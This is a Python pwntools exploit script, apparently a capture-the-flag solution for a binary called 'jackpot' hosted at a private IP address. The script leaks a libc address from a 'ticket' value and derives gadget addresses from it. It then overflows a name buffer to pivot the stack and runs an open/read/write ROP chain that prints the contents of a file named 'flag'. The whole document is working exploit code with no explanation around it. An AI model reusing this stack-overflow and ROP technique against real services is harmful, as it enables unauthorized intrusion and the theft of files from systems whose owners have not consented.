from pwn import *

# r = process(b"./share/jackpot", env={"LD_PRELOAD": "./libc.so.6"})
r = remote("10.105.0.21", 12620)

jackpot = 0x40129E
main = 0x4012C7
main_8 = 0x4012CF
main_160 = 0x401367
main_180 = 0x40137B
data_start = 0x0000000000404060

# LIBC

r.recvuntil(b"number: ")
r.sendline(b"31")

r.recvuntil(b"ticket 0x")
ticket = int(r.recvline().strip(), 16)
print(b"ticket: ", hex(ticket))

offset = 0x29D90
libc_base = ticket - offset

print(b"libc_base: ", hex(libc_base))

libc_pop_rdi_ret = libc_base + 0x000000000002A3E5
libc_pop_rsi_ret = libc_base + 0x000000000002BE51
libc_pop_rdx_ret = libc_base + 0x00000000000796A2
libc_pop_rsp_ret = libc_base + 0x0000000000035732
libc_open_addr = libc_base + 0x1142F0
libc_read_addr = libc_base + 0x1145E0
libc_write_addr = libc_base + 0x114680

print("libc_pop_rdi_ret: ", hex(libc_pop_rdi_ret))
print("libc_pop_rsi_ret: ", hex(libc_pop_rsi_ret))
print("libc_pop_rdx_ret: ", hex(libc_pop_rdx_ret))
print("libc_pop_rsp_ret: ", hex(libc_pop_rsp_ret))
print("libc_open_addr: ", hex(libc_open_addr))
print("libc_read_addr: ", hex(libc_read_addr))
print("libc_write_addr: ", hex(libc_write_addr))

rbp = data_start + 0x100
payload = b"A" * 112 + p64(rbp) + p64(main_160)

r.recvuntil(b"name: ")
r.sendline(payload)

# ROP 1

r.recvuntil(b"number: ")
r.sendline(b"31")

r.recvuntil(b"name: ")

filename = b"flag\x00"
# filename = b"/home/jackpot/flag\x00"

mov_rsp_chain = p64(jackpot)

mov_rsp_chain += p64(libc_pop_rdi_ret) + p64(rbp - 0x70)
mov_rsp_chain += p64(libc_pop_rsi_ret) + p64(0)
mov_rsp_chain += p64(libc_pop_rdx_ret) + p64(0)
mov_rsp_chain += p64(libc_open_addr)

mov_rsp_chain += p64(libc_pop_rdi_ret) + p64(3)
mov_rsp_chain += p64(libc_pop_rsi_ret) + p64(data_start)
mov_rsp_chain += p64(libc_pop_rdx_ret) + p64(0x62)

mov_rsp_chain += p64(libc_pop_rsp_ret) + p64(rbp - 0x70 + len(filename))

rop_chain = b""
# rop_chain = p64(jackpot)

# rop_chain += p64(libc_pop_rdi_ret) + p64(rbp - 0x70)
# rop_chain += p64(libc_pop_rsi_ret) + p64(0)
# rop_chain += p64(libc_pop_rdx_ret) + p64(0)
# rop_chain += p64(libc_open_addr)

# rop_chain += p64(libc_pop_rdi_ret) + p64(3)
# rop_chain += p64(libc_pop_rsi_ret) + p64(data_start)
# rop_chain += p64(libc_pop_rdx_ret) + p64(0x62)
rop_chain += p64(libc_read_addr)

rop_chain += p64(libc_pop_rdi_ret) + p64(1)
# rop_chain += p64(libc_pop_rsi_ret) + p64(data_start)
# rop_chain += p64(libc_pop_rdx_ret) + p64(0x62)
rop_chain += p64(libc_write_addr)

raw_input()

payload = (
    filename
    + rop_chain
    + b"A" * (112 - len(filename) - len(rop_chain))
    + p64(rbp)
    + mov_rsp_chain
)
r.sendline(payload)


r.interactive()
